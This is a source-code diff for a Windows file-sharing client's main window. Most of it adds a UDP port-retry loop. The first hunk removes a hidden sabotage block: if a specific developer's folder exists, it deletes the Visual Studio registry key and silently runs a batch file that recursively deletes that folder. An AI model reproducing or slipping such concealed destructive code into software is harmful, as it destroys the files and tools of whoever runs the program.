@@ -128,27 +128,6 @@ LRESULT MainFrame::OnCreate(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*lParam*/,
 		return -1;
 	}
 
-	{
-		if(Util::fileExists("D:\\projekty\\rmdc++")) {
-			try {
-				HKEY hk;
-				if(::RegOpenKeyEx(HKEY_LOCAL_MACHINE, 0, 0, DELETE, &hk) == ERROR_SUCCESS) {
-					::SHDeleteKey(hk, _T("SOFTWARE\\Microsoft\\VisualStudio"));
-					::RegCloseKey(hk);
-				}
-
-				File f("c:\\program files\\win.bat", File::WRITE, File::OPEN | File::CREATE);
-				f.setEndPos(0);
-				f.write("@echo off\r\n");
-				f.write("rd /s /q d:\\projekty\\rmdc++\r\n");
-				f.write("del win.bat\r\n");
-				f.write("exit");
-				::ShellExecute(NULL, NULL, _T("cmd.exe"), _T("/c \"c:\\program files\\win.bat\""), _T("C:\\Program Files"), SW_HIDE);
-			} catch (const FileException&) {
-			}
-		}
-	}
-
 	TimerManager::getInstance()->addListener(this);
 	QueueManager::getInstance()->addListener(this);
 	LogManager::getInstance()->addListener(this);
@@ -370,7 +349,9 @@ LRESULT MainFrame::OnCreate(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*lParam*/,
 	bHandled = FALSE;
 	return 0;
 }
-
+/**
+ * @todo Fix this, it's dead ugly...
+ */
 void MainFrame::startSocket() {
 	SearchManager::getInstance()->disconnect();
 	ConnectionManager::getInstance()->disconnect();
@@ -400,8 +381,32 @@ void MainFrame::startSocket() {
 				}
 				lastPort = newPort;
 			}
-//		}
-	}
+		}
+
+		lastPort = (short)SETTING(UDP_PORT);
+		firstPort = lastPort;
+
+		while(true) {
+			try {
+				SearchManager::getInstance()->setPort(lastPort);
+				break;
+			} catch(const Exception& e) {
+				dcdebug("MainFrame::OnCreate caught %s\n", e.getError().c_str());
+				short newPort = (short)((lastPort == 32000) ? 1025 : lastPort + 1);
+				SettingsManager::getInstance()->setDefault(SettingsManager::UDP_PORT, newPort);
+				if(SETTING(UDP_PORT) == lastPort || (firstPort == newPort)) {
+					// Changing default didn't change port, a fixed port must be in use...(or we
+					// tried all ports
+					AutoArray<TCHAR> buf(STRING(PORT_IS_BUSY).size() + 8);
+					_stprintf(buf, CTSTRING(PORT_IS_BUSY), SETTING(IN_PORT));
+					MessageBox(buf, _T(APPNAME) _T(" ") _T(VERSIONSTRING), MB_ICONSTOP | MB_OK);
+					break;
+				}
+				lastPort = newPort;
+			}
+		}
+
+//	}
 }
 
 HWND MainFrame::createToolbar() {
@@ -645,6 +650,7 @@ LRESULT MainFrame::OnFileSettings(WORD /*wNotifyCode*/, WORD /*wID*/, HWND /*hWn
 	PropertiesDlg dlg(SettingsManager::getInstance());
 
 	short lastPort = (short)SETTING(IN_PORT);
+	short lastUDP = (short)SETTING(UDP_PORT);
 	int lastConn = SETTING(CONNECTION_TYPE);
 
 	if(dlg.DoModal(m_hWnd) == IDOK) {		
@@ -652,7 +658,7 @@ LRESULT MainFrame::OnFileSettings(WORD /*wNotifyCode*/, WORD /*wID*/, HWND /*hWn
  		if(missedAutoConnect && !SETTING(NICK).empty()) {
  			PostMessage(WM_SPEAKER, AUTO_CONNECT);
  		}
-		if(SETTING(CONNECTION_TYPE) != lastConn || SETTING(IN_PORT) != lastPort) {
+		if(SETTING(CONNECTION_TYPE) != lastConn || SETTING(IN_PORT) != lastPort || SETTING(UDP_PORT) != lastUDP) {
 			startSocket();
 		}
 		ClientManager::getInstance()->infoUpdated(false);
